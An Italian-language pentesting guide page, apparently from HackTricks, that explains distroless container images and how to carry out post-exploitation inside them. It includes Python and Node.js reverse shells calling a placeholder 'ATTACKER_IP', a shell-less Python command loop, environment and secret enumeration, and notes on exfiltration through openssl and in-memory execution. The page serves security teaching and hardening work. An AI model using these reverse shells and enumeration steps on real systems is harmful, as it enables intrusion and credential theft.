# Container Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un'immagine **distroless** è un'immagine che include i **componenti runtime minimi necessari per eseguire una specifica applicazione**, rimuovendo intenzionalmente i consueti strumenti della distribuzione, come package manager, shell e ampi insiemi di utility generiche dello userland. In pratica, le immagini distroless contengono spesso soltanto il binary o il runtime dell'applicazione, le relative shared libraries, i bundle dei certificati e un layout del filesystem molto ridotto.

Il punto non è che distroless sia una nuova primitiva di isolamento del kernel. Distroless è una **strategia di progettazione delle immagini**. Modifica ciò che è disponibile **all'interno** del filesystem del container, non il modo in cui il kernel isola il container. Questa distinzione è importante, perché distroless hardens l'ambiente principalmente riducendo ciò che un attacker può utilizzare dopo aver ottenuto code execution. Non sostituisce namespaces, seccomp, capabilities, AppArmor, SELinux o qualsiasi altro meccanismo di isolamento del runtime.

## Perché Esiste Distroless

Le immagini distroless vengono utilizzate principalmente per ridurre:

- la dimensione dell'immagine
- la complessità operativa dell'immagine
- il numero di package e binary che potrebbero contenere vulnerabilità
- il numero di strumenti di post-exploitation disponibili di default per un attacker

Ecco perché le immagini distroless sono popolari nei deployment di applicazioni in produzione. Un container che non contiene shell, package manager e quasi nessuno strumento generico è solitamente più facile da gestire operativamente e più difficile da abusare interattivamente dopo una compromissione.

Esempi di famiglie di immagini distroless note includono:

- le immagini distroless di Google
- le immagini hardened/minimal di Chainguard

## Cosa Non Significa Distroless

Un container distroless **non è**:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protetto da seccomp, AppArmor o SELinux
- automaticamente al sicuro dal container escape

È comunque possibile eseguire un'immagine distroless con `--privileged`, condivisione degli host namespaces, bind mounts pericolosi o un runtime socket montato. In questo scenario, l'immagine può essere minimale, ma il container può comunque essere catastroficamente insicuro. Distroless modifica la **superficie d'attacco dello userland**, non il **confine di trust del kernel**.

## Caratteristiche Operative Tipiche

Quando comprometti un container distroless, la prima cosa che noti solitamente è che le assunzioni comuni smettono di essere valide. Potrebbero non esserci `sh`, `bash`, `ls`, `id`, `cat` e a volte neppure un ambiente basato su libc che si comporti come previsto dal tuo consueto tradecraft. Questo influisce sia sull'offense sia sulla defense, perché la mancanza di strumenti rende diversi il debugging, l'incident response e la post-exploitation.

I pattern più comuni sono:

- il runtime dell'applicazione esiste, ma c'è ben poco altro
- i payload basati sulla shell falliscono perché non esiste alcuna shell
- le comuni one-liner di enumeration falliscono perché mancano i binary di supporto
- spesso sono presenti anche protezioni del file system, come un rootfs read-only o `noexec` sulle posizioni tmpfs scrivibili

È questa combinazione che solitamente porta a parlare di "weaponizing distroless".

## Distroless E La Post-Exploitation

La principale difficoltà offensiva in un ambiente distroless non è sempre la RCE iniziale. Spesso è ciò che accade dopo. Se il workload compromesso permette code execution in un language runtime come Python, Node.js, Java o Go, potresti essere in grado di eseguire logica arbitraria, ma non tramite i normali workflow shell-centrici comuni su altri target Linux.

Ciò significa che la post-exploitation spesso si orienta in una delle tre direzioni seguenti:

1. **Utilizzare direttamente il language runtime esistente** per enumerare l'ambiente, aprire socket, leggere file o preparare payload aggiuntivi.
2. **Portare i propri strumenti in memoria** se il filesystem è read-only o le posizioni scrivibili sono montate con `noexec`.
3. **Abusare dei binary già presenti nell'immagine** se l'applicazione o le sue dipendenze includono qualcosa di inaspettatamente utile.

## Abuso

### Enumerare Il Runtime Già Disponibile

In molti container distroless non c'è una shell, ma esiste comunque un application runtime. Se il target è un servizio Python, Python è presente. Se il target è Node.js, Node è presente. Questo spesso offre funzionalità sufficienti per enumerare i file, leggere le variabili d'ambiente, aprire reverse shell e preparare l'esecuzione in memoria senza invocare mai `/bin/sh`.

Un semplice esempio con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un esempio semplice con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impatto:

- recupero delle variabili d'ambiente, che spesso includono credenziali o endpoint di servizi
- enumerazione del filesystem senza `/bin/ls`
- identificazione dei percorsi scrivibili e dei secret montati

### Reverse Shell Without `/bin/sh`

Se l'immagine non contiene `sh` o `bash`, una reverse shell basata su shell classica potrebbe fallire immediatamente. In tal caso, usa il language runtime installato.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` non esiste, sostituisci la riga finale con l'esecuzione diretta dei comandi tramite Python oppure con un loop REPL di Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ancora, se `/bin/sh` è assente, usa direttamente le API filesystem, process e networking di Node invece di avviare una shell.

### Esempio completo: No-Shell Python Command Loop

Se l'immagine dispone di Python ma non di alcuna shell, un semplice loop interattivo è spesso sufficiente per mantenere tutte le funzionalità di post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Questo non richiede un interactive shell binary. L'impatto è effettivamente lo stesso di una basic shell dal punto di vista dell'attaccante: command execution, enumeration e staging di ulteriori payload tramite il runtime esistente.

### Esecuzione di Tool In-Memory

Le immagini Distroless sono spesso combinate con:

- `readOnlyRootFilesystem: true`
- tmpfs scrivibile ma `noexec`, come `/dev/shm`
- assenza di package management tools

Questa combinazione rende inaffidabili i workflow classici del tipo "scarica il binary su disco ed eseguilo". In questi casi, le tecniche di memory execution diventano la soluzione principale.

La pagina dedicata è:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Le tecniche più rilevanti sono:

- `memfd_create` + `execve` tramite scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binary Esistenti Già Nell'Immagine

Alcune immagini distroless contengono ancora binary necessari a livello operativo che diventano utili dopo il compromise. Un esempio osservato ripetutamente è `openssl`, perché talvolta le applicazioni ne hanno bisogno per attività relative alla crittografia o a TLS.

Un quick search pattern è:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` è presente, potrebbe essere utilizzabile per:

- connessioni TLS in uscita
- esfiltrazione di dati tramite un canale egress consentito
- staging dei dati del payload tramite blob codificati/crittografati

L'abuso esatto dipende da ciò che è effettivamente installato, ma l'idea generale è che distroless non significhi "nessuno strumento"; significa "molti meno strumenti rispetto a una normale image di distribuzione".

## Verifiche

L'obiettivo di queste verifiche è determinare se l'image è realmente distroless in pratica e quali binari runtime o helper siano ancora disponibili per il post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Cosa è interessante qui:

- Se non esiste alcuna shell ma è presente un runtime come Python o Node, il post-exploitation dovrebbe passare all'esecuzione guidata dal runtime.
- Se il root filesystem è in sola lettura e `/dev/shm` è scrivibile ma `noexec`, le tecniche di esecuzione in memoria diventano molto più rilevanti.
- Se sono presenti helper binaries come `openssl`, `busybox` o `java`, potrebbero offrire funzionalità sufficienti per avviare un accesso ulteriore.

## Default del Runtime

| Stile dell'image / piattaforma | Stato predefinito | Comportamento tipico | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Image in stile Google distroless | Userland minimale per progettazione | Nessuna shell, nessun package manager, solo dipendenze dell'applicazione/runtime | aggiunta di debugging layers, sidecar shells, copia di busybox o tooling |
| Image minimali Chainguard | Userland minimale per progettazione | Superficie dei package ridotta, spesso focalizzata su un singolo runtime o servizio | utilizzo di `:latest-dev` o varianti di debug, copia di strumenti durante la build |
| Workload Kubernetes che utilizzano image distroless | Dipende dalla configurazione del Pod | Distroless influisce solo sullo userland; il security posture del Pod dipende ancora dalla specifica del Pod e dai default del runtime | aggiunta di ephemeral debug containers, host mounts, impostazioni di Pod privilegiato |
| Docker / Podman che eseguono image distroless | Dipende dai run flags | Filesystem minimale, ma la sicurezza del runtime dipende ancora dai flag e dalla configurazione del daemon | `--privileged`, condivisione degli host namespace, runtime socket mounts, writable host binds |

Il punto chiave è che distroless è una **proprietà dell'image**, non una protezione del runtime. Il suo valore deriva dalla riduzione di ciò che è disponibile all'interno del filesystem dopo una compromissione.

## Pagine correlate

Per i bypass del filesystem e dell'esecuzione in memoria comunemente necessari negli ambienti distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Per gli abusi del container runtime, dei socket e dei mount che si applicano ancora ai workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
